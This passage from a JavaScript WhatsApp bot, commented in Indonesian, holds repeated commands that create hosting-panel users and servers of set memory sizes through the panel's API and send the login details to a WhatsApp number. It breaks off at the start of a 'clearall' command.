 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '3gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "3024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '4gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "4024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '5gb-2': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli2
 let memo = "5024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain2 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain2 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain2 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey2,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli2
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain2}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '1gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "1024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '2gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "2024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '3gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "3024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '4gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "4024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case '5gb-3': {
 if (!isPrem && !isCreator) return m.reply('*[ System Notice ]* Khusus Owner Dan Pengguna Premium');
 
 let t = text.split('-');
 if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username-nomer`);

 let username = t[0].trim();
 let u =
 t[1] // Jika ada teks setelah '-'
 ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 : m.mentionedJid && m.mentionedJid[0]
 ? m.mentionedJid[0]
 : m.quoted
 ? m.quoted.sender
 : null;

 if (!u) return m.reply("Nomor target tidak valid. Silakan mention atau tulis nomor setelah tanda '-'.");

 let name = username;
 let email = username + "@gmail.com";
 let ownername = global.namaowner || "Pemilik Bot";
 let egg = "15"; // Egg ID
 let loc = "1"; // Lokasi server untuk unli3
 let memo = "5024"; // Memori unlimited
 let cpu = "0"; // CPU unlimited
 let disk = "0"; // Disk unlimited
 let password = crypto.randomBytes(5).toString('hex');

 try {
 // Buat pengguna
 let f = await fetch(global.domain3 + "/api/application/users", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 email: email,
 username: username,
 first_name: username,
 last_name: username,
 language: "en",
 password: password.toString(),
 }),
 });

 let data = await f.json();
 if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

 let user = data.attributes;

 // Ambil detail Egg
 let f2 = await fetch(global.domain3 + "/api/application/nests/5/eggs/" + egg, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 });

 let eggData = await f2.json();
 let startupCmd = eggData.attributes.startup;

 // Buat server
 let f3 = await fetch(global.domain3 + "/api/application/servers", {
 method: "POST",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: "Bearer " + global.apikey3,
 },
 body: JSON.stringify({
 name: name,
 description: "Server Unlimited",
 user: user.id,
 egg: parseInt(egg),
 docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
 startup: startupCmd,
 environment: {
 INST: "npm",
 USER_UPLOAD: "0",
 AUTO_UPDATE: "0",
 CMD_RUN: "npm start",
 },
 limits: {
 memory: memo,
 swap: 0,
 disk: disk,
 io: 500,
 cpu: cpu,
 },
 feature_limits: {
 databases: 0,
 backups: 0,
 allocations: 1,
 },
 deploy: {
 locations: [parseInt(loc)], // Lokasi server untuk unli3
 dedicated_ip: false,
 port_range: [],
 },
 }),
 });

 let serverRes = await f3.json();
 if (serverRes.errors) return m.reply(JSON.stringify(serverRes.errors[0], null, 2));

 let server = serverRes.attributes;

 // Kirim pesan konfirmasi server ke target
 let ctf = `┌───「 *❀SalwaCantik❀* 」───
│ *Username* : ${user.username}
│ *Password* : ${password}
│ *Link Panel* : ${global.domain3}
└───────────────────
> *_© Developer : ❀SalwaCantik❀_*`;

 await cupen.sendMessage(u, {
 video: { url: "https://files.catbox.moe/et30hu.jpg" }, // URL video untuk konfirmasi
 caption: ctf,
 gifPlayback: true,
 contextInfo: {
 externalAdReply: {
 title: 'Unlimited Server Created',
 body: 'Bot WhatsApp Multi-Fungsi',
 thumbnailUrl: 'https://files.catbox.moe/fh0a6r.jpg', // Thumbnail
 mediaType: 1,
 renderLargerThumbnail: false,
 },
 },
 });

 m.reply(`✅ Paket berhasil dikirim ke ${username}`);
 } catch (err) {
 console.error(err);
 m.reply("❌ Terjadi kesalahan saat membuat user atau server.");
 }
}
break;
//<><>><><><><><><><><><><><><><><><><><><><><><><<<><><><><><><><><><><>
case 'clearall':
{
 const argsString = body.trim();
 const [serverIdsString, adminIdsString] = argsString.split('|').map(part => part.trim()); // Memisahkan ID server dan ID admin
 const excludedServerIds = serverIdsString.split(',').slice(1).map(id => id.trim()); // ID server yang dikecualikan
 const excludedAdminIds = adminIdsString ? adminIdsString.split(',').map(id => id.trim()) : []; // ID admin yang dikecualikan

 if (excludedServerIds.length === 0 && excludedAdminIds.length === 0) {
 return m.reply('Tolong masukkan ID server dan/atau ID admin yang ingin dikecualikan.\nContoh: .clearall ,idserver,idserver,idserver|idadmin,idadmin,idadmin');
 }

 try {
